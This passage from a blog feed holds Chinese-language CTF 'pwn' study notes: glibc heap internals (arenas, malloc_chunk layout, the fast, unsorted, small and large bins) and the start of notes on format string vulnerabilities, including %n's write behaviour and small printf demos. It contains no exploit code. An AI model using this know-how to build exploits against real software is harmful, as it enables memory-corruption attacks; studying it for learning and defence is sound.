为上一个（后面的）chunk，高地址相邻处的 chunk 为下一个（前面的）chunk。** 为了方便管理，glibc 将不同大小范围的 chunk 组织成不同的 bin 。如 fast bin 、small bin 、large bin 等，在这些链表中的 chunk 分别叫作 fast chunk 、small chunk 和 large chunk 。</p>\n<h2 id=\"2重要概念和结构体\"><a class=\"markdownIt-Anchor\" href=\"#2重要概念和结构体\">#</a> 2. 重要概念和结构体：</h2>\n<h3 id=\"arena\"><a class=\"markdownIt-Anchor\" href=\"#arena\">#</a> arena：</h3>\n<p>​\tarena 包含一片或数片连续的内存，堆块将会从这片区域划分给用户。主线程的 arena 被称为 main_arena，它包含 start_brk 和 brk 之间的这片连续内存。</p>\n<p>​\t主线程的 arena 只有堆，子线程的 arena 可以有数片连续内存。如果主线程的堆大小不够分的话可以通过 brk () 调用来扩展，但是子线程分配的映射段大小是固定的，不可以扩展，所以子线程分配出来的一段映射段不够用的话就需要再次使用 mmap () 来分配新的内存。</p>\n<h3 id=\"heap_info结构体\"><a class=\"markdownIt-Anchor\" href=\"#heap_info结构体\">#</a> heap_info 结构体：</h3>\n<p>​\t如之前所说，子线程的 arena 可以有多片连续内存，这些内存被称为 heap。每一个 heap 都有自己的 heap header 。其定义如下，heap header 是通过链表相连接的，并且 heap header 里面保存了指向其他所属的 arena 的指针。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">heap_info</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  mstate ar_ptr;\t\t\t\t \t<span class=\"comment\">/* Arena for this heap. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">heap_info</span> *<span class=\"title\">prev</span>;</span> \t\t\t<span class=\"comment\">/* Previous heap. */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size;   \t\t\t\t\t<span class=\"comment\">/* Current size in bytes. */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> mprotect_size; \t\t\t<span class=\"comment\">/* Size in bytes that has been mprotected</span></span><br><span class=\"line\"><span class=\"comment\">                           \t\t\t   PROT_READ|PROT_WRITE.  */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Make sure the following data is properly aligned, particularly</span></span><br><span class=\"line\"><span class=\"comment\">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class=\"line\"><span class=\"comment\">     MALLOC_ALIGNMENT. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> pad[<span class=\"number\">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class=\"line\">&#125; heap_info;</span><br></pre></td></tr></table></figure>\n<h3 id=\"malloc_state结构体\"><a class=\"markdownIt-Anchor\" href=\"#malloc_state结构体\">#</a> malloc_state 结构体：</h3>\n<p>​\t每个线程只有一个 arena header，里面保存了 bin、top chunk 等信息。主线程的 main_arena <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1saWJjLXA2NmZpMDBibmxoLnNv\">保存在 libc.so</span> 的数据段里，其他线程的 arena 则保存在给该 arena 分配的 heap 里面。malloc_state 定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* Serialize access.  */</span></span><br><span class=\"line\">  <span class=\"type\">mutex_t</span> mutex;</span><br><span class=\"line\">  <span class=\"comment\">/* Flags (formerly in max_fast).  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> flags;</span><br><span class=\"line\">  <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class=\"line\">  <span class=\"comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class=\"line\">  mchunkptr top;</span><br><span class=\"line\">  <span class=\"comment\">/* The remainder from the most recent split of a small request */</span></span><br><span class=\"line\">  mchunkptr last_remainder;</span><br><span class=\"line\">  <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">  mchunkptr bins[NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">/* Bitmap of bins */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> binmap[BINMAPSIZE];</span><br><span class=\"line\">  <span class=\"comment\">/* Linked list */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">  <span class=\"comment\">/* Linked list for free arenas.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next_free</span>;</span></span><br><span class=\"line\">  <span class=\"comment\">/* Memory allocated from the system in this arena.  */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T system_mem;</span><br><span class=\"line\">  INTERNAL_SIZE_T max_system_mem;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"malloc_chunk结构体\"><a class=\"markdownIt-Anchor\" href=\"#malloc_chunk结构体\">#</a> malloc_chunk 结构体：</h3>\n<p>​\tchunk 是 glibc 管理内存的基本单位，整个堆在初始化后会被当成一个 free  chunk，称之为 top chunk ，每次用户请求内存时，如果 bins 中没有合适的 chunk ，malloc 就会从 top chunk 中进行划分，如果 top chunk 的大小不够，则调用 brk () 扩展堆的大小，然后从新生成的 top chunk 中进行切分。用户释放内存时，glibc 会先根据情况将释放的 chunk 与其他相邻的 free chunk 合并，然后加入合适的 bin 中。</p>\n<p>​\t下图展示了堆块申请和释放的过程。首先，用户连续申请了三个堆块 A、B、C，此时释放 chunk B ，由于它与 top chunk 不相邻，所以会被放入 bin 中，成为一个 free chunk。现在再次申请一个与 B 相同大小的堆块，则 malloc 将从 bin 中取出 chunk B ，回到一开始的状态，bin 的表头也会指向 null。。但如果用户连续释放 chunk A 和 chunk B ，由于他们相邻且都是 free chunk ，那么就会被合并成一个大的 chunk 放入 bin 中。</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/01387fb92db746dc8ec05b89342e1ee2.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t对以上知识有了简单的印象之后，就可以看看 chunk 的信息是怎么被 glibc 记录的，下面是 malloc chunk 的结构体定义：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> &#123;</span></span><br><span class=\"line\">  INTERNAL_SIZE_T      prev_size;  <span class=\"comment\">/* Size of previous chunk (if free).  */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T      size;       <span class=\"comment\">/* Size in bytes, including overhead. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span>         <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"comment\">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span> <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>​\t在默认情况下，INTERNAL_SIZE_T 的大小在 64 位系统下是 8 字节，32 位系统下是 4 字节。以下是关于 malloc_chunk 的各个成员的功能：</p>\n<blockquote>\n<ul>\n<li>\n<p><strong>prev_size</strong>, 如果该 chunk 的 ** 物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）** 是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</p>\n</li>\n<li>\n<p>size</p>\n<p>，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</p>\n<ul>\n<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>\n<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>\n<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>\n</ul>\n</li>\n<li>\n<p>fd，bk</p>\n<p>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p>\n<ul>\n<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>\n<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>\n<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>\n</ul>\n</li>\n<li>\n<p>fd_nextsize， bk_nextsize</p>\n<p>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p>\n<ul>\n<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>\n<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>\n<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<p>​\t一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处，也就是 mem 处的地址。</strong></p>\n<p>​\t当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Size of previous chunk, <span class=\"keyword\">if</span> <span class=\"title function_\">unallocated</span> <span class=\"params\">(P clear)</span>  |</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class=\"line\">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             User data starts here...                          .</span><br><span class=\"line\">        .                                                               .</span><br><span class=\"line\">        .             <span class=\"params\">(malloc_usable_size() bytes)</span>                      .</span><br><span class=\"line\">next    .                                                               |</span><br><span class=\"line\">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             <span class=\"params\">(size of chunk, but used <span class=\"keyword\">for</span> application data)</span>    |</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>\n<p>​\t被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Size of previous chunk, <span class=\"keyword\">if</span> <span class=\"title function_\">unallocated</span> <span class=\"params\">(P clear)</span>  |</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class=\"line\">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Forward pointer to next chunk in <span class=\"built_in\">list</span>             |</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Back pointer to previous chunk in <span class=\"built_in\">list</span>            |</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Unused <span class=\"title function_\">space</span> <span class=\"params\">(may be <span class=\"number\">0</span> bytes <span class=\"type\">long</span>)</span>                .</span><br><span class=\"line\">        .                                                               .</span><br><span class=\"line\"> next   .                                                               |</span><br><span class=\"line\">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class=\"line\">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class=\"line\">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>\n<h2 id=\"3各类bin介绍\"><a class=\"markdownIt-Anchor\" href=\"#3各类bin介绍\">#</a> 3. 各类 bin 介绍：</h2>\n<p>​\tchunk 被释放时，glibc 会将它们重新组织起来，构成不同的 bin 链表，当用户再次申请时，就从中寻找合适的 chunk 返回用户。不同大小区间 chunk 被划分到不同的 bin 中，再加上一种特殊的 bin，一共有四种：Fast bin 、Samll bin 、 Large bin 、和 Unsorted bin 。这些 bin 记录在 malloc_state 结构中。</p>\n<ul>\n<li>fastbinsY ：这是一个 bin 数组，里面有 NFASTBINS 个 fast bin。</li>\n<li>bins：也是一个 bin 数组，一共有 126 个 bin ，按顺序分别是：\n<ul>\n<li>bin 1 为 unsorted bin</li>\n<li>bin 2 到 bin 63 为 small bin</li>\n<li>bin 64 到 bin 126 为 large bin</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"fast-bin\"><a class=\"markdownIt-Anchor\" href=\"#fast-bin\">#</a> fast bin ：</h3>\n<p>​\t在实践中，程序申请和释放的堆块往往都比较小，所以 glibc 对这类 bin 使用单链表结构，并采用 LIFO（后进先出）的分配策略。为了加快速度，fast bin 里的 chunk 不会进行合并操作，所以下一个 chunk 的 PRV_INUSE 始终标记为 1，使其处于使用状态。同一个 fast bin 里 chunk 大小相同，并且在 fastbinY 数组里按照从小到大的顺序排列，序号为 0 的 fast bin 中容纳的 chunk 大小为 4<em>SIZE_SZ 字节，随着序号增加，所容纳的 chunk 递增 2</em>SIZE_SZ 字节。</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/08dc51489bb7469c8a03c0f73de586bb.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"unsorted-bin\"><a class=\"markdownIt-Anchor\" href=\"#unsorted-bin\">#</a> unsorted bin：</h3>\n<p>​\t一定大小的 chunk 被释放时，在进入 small bin 或者 large bin 之前，会先加入 unsorted bin 。在实践中，一个释放的 chunk 常常很快就会被重新使用，所以将其先加入 unsorted bin 可以加快分配的速度。 unsorted bin 使用双链表结构，并采用 FIFO（先进先出）的分配策略。与 fastbinY 不同，unsorted bin 中的 chunk 大小可能是不同的，并且由于是双向链表结构，一个 bin 会占用 bins 的两个元素。</p>\n<h3 id=\"small-bin\"><a class=\"markdownIt-Anchor\" href=\"#small-bin\">#</a> small bin：</h3>\n<p>​\t同一个 small bin 里 chunk 的大小相同，采用双链表结构，使用频率介于 fast bin 和 large bin 之间。small bin 在 bins 里居第 2 到 63 位，共 62 个。根据排序，每个 small bin 的大小为 2<em>SIZE_SZ</em>inx（idx 表示 bins 数组的下标）。在 64 位系统下，最小的 small chunk 为 2*8*2=32 字节，最大的 small chunk 为 2*8*63=1008 字节。由于 small bin 和 fast bin 有重合的部分，所以这些 chunk 在某些情况下会被加入 small bin 中。</p>\n<h3 id=\"large-bin\"><a class=\"markdownIt-Anchor\" href=\"#large-bin\">#</a> large bin：</h3>\n<p>​\tlarge bin 在 bins 里居 64 到 126 位，共 63 个，被分成了 6 组，每组 bin 所能容纳的 chunk 按顺序排成等差数列，公差分别如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">32 bins of size\t\t\t64</span><br><span class=\"line\">16 bins of size\t\t   512</span><br><span class=\"line\"> 8 bins of size\t\t  4096</span><br><span class=\"line\"> 4 bins of size\t\t 32768</span><br><span class=\"line\"> 2 bins of size\t\t262144</span><br><span class=\"line\"> 1 bin  of size\t\twhat&#x27;sleft</span><br></pre></td></tr></table></figure>\n<p>​\t32 位系统下第一个 large bin 的 chunk 最小为 512 字节，第二个 large bin 的额 chunk 最小为 512+64 字节（处于 [512，512+64] 之间的 chunk 都属于第一个 large bin），以此类推。64 位系统也是一样的，第一个 large bin 的 chunk 最小为 1024 字节，第二个 large bin 的 chunk 最小为 1024+64 字节（处于 [1024，1024+64] 之间的 chunk 都属于第一个 large bin）以此类推。</p>\n<p>​\tlarge bin 也是采用双链表结构，里面的 chunk 从头节点的 fd 指针开始，按大小顺序进行排列。为了加快检索速度，fd_nextsize 和 bk_nextsize 指针用于指向第一个与自己大小不同的 chunk 时，所以也只有在加入了大小不同的 chunk 时，这两个指针才会被修改。</p>\n<h2 id=\"参考资料\"><a class=\"markdownIt-Anchor\" href=\"#参考资料\">#</a> 参考资料：</h2>\n<p>​\t《CTF 竞赛权威指南 pwn 篇》</p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/a698ff8.html",
            "url": "http://blog.g01den.top/posts/a698ff8.html",
            "title": "pwn学习笔记（5）--格式化字符串漏洞（未完全完成）",
            "date_published": "2024-03-05T11:10:34.000Z",
            "content_html": "<h1 id=\"pwn学习笔记5格式化字符串漏洞\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记5格式化字符串漏洞\">#</a> pwn 学习笔记（5）–格式化字符串漏洞</h1>\n<p>​\t<strong>前言：由于条件有限，因此对于该漏洞的学习不算很多，</strong></p>\n<h2 id=\"格式化字符串漏洞基础\"><a class=\"markdownIt-Anchor\" href=\"#格式化字符串漏洞基础\">#</a> 格式化字符串漏洞基础：</h2>\n<h3 id=\"格式化字符串介绍\"><a class=\"markdownIt-Anchor\" href=\"#格式化字符串介绍\">#</a> 格式化字符串介绍：</h3>\n<p>​\t格式化字符串函数可以接收可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>，格式化字符串的利用一般分为三个部分：</p>\n<blockquote>\n<ul>\n<li>格式化字符串函数</li>\n<li>格式化字符串</li>\n<li>[后续参数]</li>\n</ul>\n</blockquote>\n<h3 id=\"格式化字符串函数\"><a class=\"markdownIt-Anchor\" href=\"#格式化字符串函数\">#</a> 格式化字符串函数：</h3>\n<p>​\t常见的格式化字符串有：</p>\n<blockquote>\n<p>输入：</p>\n<ul>\n<li>scanf()</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>输出：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">基本介绍</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">printf</td>\n<td style=\"text-align:center\">输出到 stdout</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fprintf</td>\n<td style=\"text-align:center\">输出到指定 FILE 流</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出到 stdout</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vfprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出到指定 FILE 流</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">sprintf</td>\n<td style=\"text-align:center\">输出到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">snprintf</td>\n<td style=\"text-align:center\">输出指定字节数到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vsprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vsnprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出指定字节到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">setproctitle</td>\n<td style=\"text-align:center\">设置 argv</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">syslog</td>\n<td style=\"text-align:center\">输出日志</td>\n</tr>\n</tbody>\n</table>\n</blockquote>\n<h3 id=\"格式化字符串的格式\"><a class=\"markdownIt-Anchor\" href=\"#格式化字符串的格式\">#</a> 格式化字符串的格式：</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>\n<p>​\t其中，需要注意的有 parameter 参数，以及 type 参数：</p>\n<blockquote>\n<p>parameter：</p>\n<pre><code>  n$，获取格式化字符串中的指定参数\n</code></pre>\n</blockquote>\n<blockquote>\n<p>type：</p>\n<ul>\n<li>d/i，有符号整数</li>\n<li>u，无符号整数</li>\n<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>\n<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>\n<li>p， void * 型，输出对应变量的值。printf (&quot;% p&quot;,a) 用地址的格式打印变量 a 的值，printf (&quot;% p&quot;, &amp;a) 打印变量 a 所在的地址。</li>\n<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>\n<li>%， ' <code>%</code> ' 字面值，不接受任何 flags, width。</li>\n</ul>\n</blockquote>\n<p>​\t下面使用几个案例来说明下几个需要注意的参数：</p>\n<blockquote>\n<p>parameter：</p>\n<pre><code>  n$ 表示获取后面参数列表中的第几个参数。\n</code></pre>\n</blockquote>\n<p>​\t比如如下代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%2$d\\n&quot;</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t通过编译运行之后得到的值却是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/home/g01den/Temp<span class=\"comment\"># ./a</span></span><br><span class=\"line\">2</span><br></pre></td></tr></table></figure>\n<p>​\t好了，我们稍微修改下刚刚的代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d%d%d\\n&quot;</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t然后编译为 32 位之后，查看下汇编代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span 